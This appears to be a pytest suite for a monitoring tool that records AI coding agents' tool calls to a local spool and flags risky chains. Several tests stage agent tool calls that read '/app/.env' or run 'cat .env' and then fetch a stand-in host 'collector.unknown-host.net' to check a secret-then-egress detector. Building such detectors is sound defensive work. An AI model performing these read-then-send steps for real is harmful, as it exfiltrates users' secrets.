"""Local-first: nothing is lost when the dashboard is not running.

Proxies and the Claude Code hook append to a spool; the dashboard ingests it
through the same path as POST /v1/events. These tests cross the real process
boundaries that matter (a wrapped server is a subprocess an app launches)
because every serious bug so far lived between components (HYPOTHESISE.md §14).
"""

import asyncio
import io
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest
from hypothesise_proxy import spool
from hypothesise_proxy.upstream import resolve_command

ROOT = Path(__file__).resolve().parents[1]
FIXTURE = str(Path(__file__).parent / "fixtures" / "fake_mcp_server.py")


@pytest.fixture
def hhome(tmp_path, monkeypatch):
    monkeypatch.setenv("HYPOTHESISE_HOME", str(tmp_path / "hh"))
    return tmp_path / "hh"


# --- spool ------------------------------------------------------------------

def test_spool_round_trip_and_commit(hhome):
    assert spool.append([{"a": 1}, {"a": 2}]) == 2
    reader = spool.SpoolReader()
    recs, offs = reader.read()
    assert [r["a"] for r in recs] == [1, 2]
    reader.commit(offs)
    assert reader.read()[0] == []
    spool.append([{"a": 3}])
    assert [r["a"] for r in reader.read()[0]] == [3]


def test_uncommitted_read_is_read_again(hhome):
    """Commit happens after ingest succeeds, so a crash re-reads, never loses."""
    spool.append([{"a": 1}])
    reader = spool.SpoolReader()
    reader.read()
    assert len(reader.read()[0]) == 1


def test_a_half_written_line_waits_for_the_next_read(hhome):
    spool.append([{"a": 1}])
    f = spool.spool_files()[0]
    with open(f, "ab") as fh:
        fh.write(b'{"a": 2')
    reader = spool.SpoolReader()
    recs, offs = reader.read()
    assert [r["a"] for r in recs] == [1]
    reader.commit(offs)
    with open(f, "ab") as fh:
        fh.write(b"}\n")
    assert [r["a"] for r in reader.read()[0]] == [2]


def test_spool_is_bounded(hhome, monkeypatch):
    monkeypatch.setattr(spool, "MAX_SPOOL_BYTES", 10)
    assert spool.append([{"x": "y" * 50}]) == 1
    assert spool.append([{"x": 1}]) == 0, "past the cap, events are dropped"


def test_spool_never_raises(monkeypatch, tmp_path):
    blocker = tmp_path / "file"
    blocker.write_text("not a directory")
    monkeypatch.setenv("HYPOTHESISE_HOME", str(blocker))
    assert spool.append([{"a": 1}]) == 0


def test_steps_count_per_session(hhome):
    assert [spool.next_step("s1") for _ in range(3)] == [0, 1, 2]
    assert spool.next_step("s2") == 0


def test_prune_keeps_today_and_unread(hhome):
    d = spool.spool_dir()
    d.mkdir(parents=True)
    old = d / "events-20000101.jsonl"
    old.write_text('{"a":1}\n')
    reader = spool.SpoolReader()
    assert reader.prune() == 0, "unread files are never deleted"
    reader.commit(reader.read()[1])
    assert reader.prune() == 1
    assert not old.exists()


# --- hook -------------------------------------------------------------------

def _hook(payload, hhome):
    from hypothesise.hook import run

    assert run(stdin=io.StringIO(json.dumps(payload))) == 0
    return spool.SpoolReader().read()[0]


def test_hook_records_a_builtin_read_as_a_secret_read(hhome):
    recs = _hook({"session_id": "abc", "tool_name": "Read",
                  "tool_input": {"file_path": "/app/.env"},
                  "tool_response": {"content": "..."}}, hhome)
    (r,) = recs
    assert r["agent_id"] == "claude-code"
    assert r["session_id"] == "cc-abc"
    assert r["resource"] == {"uri": "/app/.env", "class": "secret"}
    assert r["action"] == "read"
    assert r["outcome"]["status"] == "ok"


def test_hook_keeps_the_real_server_for_mcp_tools(hhome):
    (r,) = _hook({"session_id": "s", "tool_name": "mcp__github__create_issue",
                  "tool_input": {"repo": "acme/api", "title": "x"}}, hhome)
    assert r["tool"] == {"server": "github", "name": "create_issue"}
    assert r["resource"]["uri"] == "acme/api"


def test_hook_maps_claude_tool_names_to_verbs(hhome):
    (e,) = _hook({"session_id": "s", "tool_name": "Edit",
                  "tool_input": {"file_path": "/src/app.py"}}, hhome)
    assert e["action"] == "write"


def test_hook_survives_garbage(hhome):
    from hypothesise.hook import run

    for junk in ("", "not json", "[1,2]", '{"tool_name": 5}'):
        assert run(stdin=io.StringIO(junk)) == 0


def test_hook_events_correlate_into_an_alert_on_ingest(hhome, tmp_path):
    """Read a secret with a built-in tool, then send it out — two different
    tools, one Claude session. The dashboard must see it as one chain."""
    from hypothesise_api.app import create_app, ingest_spool_once

    sid = "corr"
    _hook({"session_id": sid, "tool_name": "Read",
           "tool_input": {"file_path": "/app/.env"}}, hhome)
    _hook({"session_id": sid, "tool_name": "WebFetch",
           "tool_input": {"url": "https://collector.unknown-host.net/ingest",
                          "prompt": "post it"}}, hhome)
    app = create_app(db_url=f"sqlite:///{tmp_path / 'h.db'}")
    assert ingest_spool_once(app) == 2
    alerts = app.state.repo.alerts()
    fired = {d["detector"] for a in alerts for d in a.get("detectors") or []}
    assert "sensitive_then_egress" in fired, alerts
    assert ingest_spool_once(app) == 0, "a second pass ingests nothing twice"


# --- wrapped server, as an app would launch it -----------------------------

def _env(hhome):
    env = dict(os.environ)
    env["HYPOTHESISE_HOME"] = str(hhome)
    env.pop("HYPOTHESISE_API_URL", None)
    env["PYTHONPATH"] = os.pathsep.join(
        [str(ROOT / "packages" / p) for p in
         ("cli", "core", "store", "proxy", "api", "adapters/langgraph")])
    return env


def _rpc(*msgs):
    return "".join(json.dumps(m) + "\n" for m in msgs)


def test_wrapped_server_is_transparent_and_records_locally(hhome):
    msgs = _rpc(
        {"jsonrpc": "2.0", "id": 1, "method": "initialize",
         "params": {"protocolVersion": "2024-11-05", "clientInfo": {"name": "Cursor"}}},
        {"jsonrpc": "2.0", "method": "notifications/initialized"},
        {"jsonrpc": "2.0", "id": 2, "method": "tools/list"},
        {"jsonrpc": "2.0", "id": 3, "method": "tools/call",
         "params": {"name": "read_file", "arguments": {"path": "/app/.env"}}},
    )
    r = subprocess.run(
        [sys.executable, "-m", "hypothesise", "wrap", "--client", "cursor",
         "--server", "fs", "--", sys.executable, FIXTURE, "--name", "fs"],
        input=msgs, capture_output=True, text=True, timeout=60, env=_env(hhome))
    replies = {m["id"]: m for m in map(json.loads, r.stdout.splitlines()) if "id" in m}
    names = {t["name"] for t in replies[2]["result"]["tools"]}
    assert "read_file" in names, "tool names are unchanged by wrapping"
    assert "result" in replies[3], r.stderr
    assert "recording events to" in r.stderr

    recs = spool.SpoolReader(Path(hhome) / "spool").read()[0]
    assert len(recs) == 1
    assert recs[0]["agent_id"] == "cursor"
    assert recs[0]["tool"]["server"] == "fs"
    assert recs[0]["resource"]["class"] == "secret"


def test_wrap_falls_back_to_the_raw_server_when_it_cannot_start(hhome):
    """If Hypothesise itself is broken the user keeps their tool."""
    env = _env(hhome)
    env["HYPOTHESISE_DECISION_BUDGET_MS"] = "not-a-number"   # GateConfig blows up
    msgs = _rpc({"jsonrpc": "2.0", "id": 1, "method": "initialize",
                 "params": {"protocolVersion": "2024-11-05", "clientInfo": {}}})
    r = subprocess.run(
        [sys.executable, "-m", "hypothesise", "wrap", "--client", "cursor",
         "--server", "fs", "--", sys.executable, FIXTURE, "--name", "fs"],
        input=msgs, capture_output=True, text=True, timeout=60, env=env)
    assert "unwrapped" in r.stderr
    reply = json.loads(r.stdout.splitlines()[0])
    assert reply["id"] == 1 and "result" in reply


def test_resolve_command_searches_the_childs_path(tmp_path):
    assert resolve_command(sys.executable, {}) == sys.executable
    assert resolve_command("definitely-not-a-command-xyz", {"PATH": ""}) == \
        "definitely-not-a-command-xyz"
    exe = Path(sys.executable)
    assert Path(resolve_command(exe.name, {"PATH": str(exe.parent)})).name.startswith("python")


@pytest.mark.asyncio
async def test_shipper_keeps_events_locally_when_the_dashboard_is_down(hhome):
    """A proxy configured with --api must not lose events just because the
    dashboard is closed: they go to the spool and are read in later."""
    from hypothesise_core.events import Event, Resource, Tool
    from hypothesise_proxy.emit import EventEmitter
    from hypothesise_proxy.shipper import Shipper

    em = EventEmitter()
    sh = Shipper(api_url="http://127.0.0.1:9", emitter=em, interval=0.05,
                 timeout=0.2, spool_fallback=True)
    for i in range(3):
        em.emit(Event(agent_id="a", session_id="s", step=i,
                      tool=Tool(server="fs", name="read_file"),
                      resource=Resource(uri=f"/f{i}")))
    sh.start()
    for _ in range(100):
        if sh.stats.failed_batches:
            break
        await asyncio.sleep(0.05)
    await sh.stop()
    assert sh.stats.spooled == 3 and sh.stats.dropped == 0
    assert len(spool.SpoolReader().read()[0]) == 3


# --- the original setup: one proxy entry, shipping live --------------------

def test_config_path_finds_its_renamed_twin(tmp_path):
    from hypothesise_proxy.config import resolve_config_path

    (tmp_path / "hypothesise.config.json").write_text("{}")
    assert resolve_config_path(tmp_path / "weaver.config.json") == \
        tmp_path / "hypothesise.config.json"
    assert resolve_config_path(tmp_path / "other.json") == tmp_path / "other.json"


def test_old_data_is_brought_over_once(tmp_path):
    from hypothesise_store.db import adopt_legacy_db

    legacy = tmp_path / ".weaver" / "weaver.db"
    legacy.parent.mkdir()
    legacy.write_bytes(b"old")
    target = tmp_path / ".hypothesise" / "hypothesise.db"
    assert adopt_legacy_db(target, legacy) is True
    assert target.read_bytes() == b"old" and legacy.exists(), "copied, never moved"
    target.write_bytes(b"new")
    assert adopt_legacy_db(target, legacy) is False
    assert target.read_bytes() == b"new", "an existing database is never overwritten"


def _free_port() -> int:
    import socket

    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def test_proxy_entry_ships_live_to_a_running_dashboard(hhome, tmp_path):
    """The setup uris used before the rename, end to end: a real dashboard
    process, a real proxy subprocess fronting a real MCP server, events
    visible over HTTP without waiting for the spool."""
    import time
    import urllib.request

    port = _free_port()
    env = _env(hhome)
    api = subprocess.Popen(
        [sys.executable, "-m", "hypothesise", "api", "--port", str(port),
         "--db", f"sqlite:///{tmp_path / 'live.db'}"],
        env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        url = f"http://127.0.0.1:{port}"
        for _ in range(100):
            try:
                urllib.request.urlopen(url + "/healthz", timeout=1)
                break
            except OSError:
                time.sleep(0.1)
        cfg = tmp_path / "weaver.config.json"     # old name on purpose
        (tmp_path / "hypothesise.config.json").write_text(json.dumps({
            "mcpServers": {"fs": {"command": sys.executable,
                                  "args": [FIXTURE, "--name", "fs"]}},
            "weaver": {"agentId": "copilot-uris"}}))   # old key on purpose
        msgs = _rpc(
            {"jsonrpc": "2.0", "id": 1, "method": "initialize",
             "params": {"protocolVersion": "2024-11-05", "clientInfo": {"name": "vscode"}}},
            {"jsonrpc": "2.0", "id": 2, "method": "tools/call",
             "params": {"name": "read_file", "arguments": {"path": "/app/.env"}}})
        r = subprocess.run(
            [sys.executable, "-m", "hypothesise", "proxy", "--config", str(cfg),
             "--detect", "--api", url],
            input=msgs, capture_output=True, text=True, timeout=60, env=env)
        assert "shipping events to" in r.stderr, r.stderr
        for _ in range(50):
            stats = json.loads(urllib.request.urlopen(url + "/v1/stats").read())
            if stats["events"]:
                break
            time.sleep(0.1)
        assert stats["events"] == 1
        sessions = json.loads(urllib.request.urlopen(url + "/v1/sessions").read())
        assert sessions[0]["agent_id"] == "copilot-uris"
        assert spool.SpoolReader(Path(hhome) / "spool").read()[0] == [], \
            "with the dashboard up, nothing detours through the spool"
    finally:
        api.terminate()
        api.wait(timeout=10)


# --- Copilot hook (VS Code agent hooks) ------------------------------------

def _vs_hook(payload):
    from hypothesise.hook import run

    assert run("vscode", stdin=io.StringIO(json.dumps(payload))) == 0


def test_copilot_builtin_read_is_recorded(hhome):
    _vs_hook({"session_id": "c1", "tool_name": "view",
              "tool_input": {"path": "/Volumes/Seagate/uris/backend/.env"},
              "tool_response": "SECRET_KEY=..."})
    (r,) = spool.SpoolReader().read()[0]
    assert r["agent_id"] == "copilot"
    assert r["session_id"] == "vs-c1"
    assert r["tool"] == {"server": "copilot", "name": "view"}
    assert r["resource"]["class"] == "secret"
    assert r["action"] == "read"


def test_copilot_older_tool_names_and_terminal(hhome):
    _vs_hook({"session_id": "c2", "tool_name": "read_file",
              "tool_input": {"filePath": "/w/.env.example"}})
    _vs_hook({"session_id": "c2", "tool_name": "run_in_terminal",
              "tool_input": {"command": "cat .env"}})
    a, b = spool.SpoolReader().read()[0]
    assert a["resource"]["uri"] == "/w/.env.example" and a["action"] == "read"
    assert b["resource"]["uri"] == "shell://cat .env" and b["action"] == "execute"


def test_copilot_mcp_calls_are_left_to_the_wrapped_servers(hhome):
    """Otherwise every Copilot MCP call is recorded twice."""
    _vs_hook({"session_id": "c3", "tool_name": "mcp_fs_read_text_file",
              "tool_input": {"path": "/w/.env"}})
    assert spool.SpoolReader().read()[0] == []


def test_copilot_read_then_send_is_one_chain(hhome, tmp_path):
    from hypothesise_api.app import create_app, ingest_spool_once

    _vs_hook({"session_id": "c4", "tool_name": "view", "tool_input": {"path": "/app/.env"}})
    _vs_hook({"session_id": "c4", "tool_name": "fetch_webpage",
              "tool_input": {"urls": ["https://collector.unknown-host.net/x"]}})
    app = create_app(db_url=f"sqlite:///{tmp_path / 'c.db'}")
    assert ingest_spool_once(app) == 2
    fired = {d["detector"] for a in app.state.repo.alerts() for d in a.get("detectors") or []}
    assert "sensitive_then_egress" in fired


# --- 0.1.0a2: Cursor hook ----------------------------------------------------

def test_cursor_hook_records_builtins_and_replies_with_json(hhome, capsys):
    from hypothesise.hook import run

    assert run("cursor", stdin=io.StringIO(json.dumps({
        "conversation_id": "k1", "tool_name": "run_terminal_cmd",
        "tool_input": {"command": "cat .env"}, "tool_output": "SECRET=1"}))) == 0
    assert capsys.readouterr().out.strip() == "{}", "Cursor expects a JSON reply"
    assert run("cursor", stdin=io.StringIO(json.dumps({
        "conversation_id": "k1", "tool_name": "read_file",
        "tool_input": {"target_file": "/app/.env"}}))) == 0
    a, b = spool.SpoolReader().read()[0]
    assert a["agent_id"] == "cursor" and a["session_id"] == "cu-k1"
    assert a["resource"]["uri"] == "shell://cat .env" and a["action"] == "execute"
    assert b["resource"] == {"uri": "/app/.env", "class": "secret"} and b["action"] == "read"


def test_cursor_hook_leaves_mcp_to_the_wrapped_servers(hhome, capsys):
    from hypothesise.hook import run

    run("cursor", stdin=io.StringIO(json.dumps({
        "conversation_id": "k2", "tool_name": "mcp_fs_read_file", "tool_input": {"path": "/x"}})))
    assert spool.SpoolReader().read()[0] == []
    assert capsys.readouterr().out.strip() == "{}"
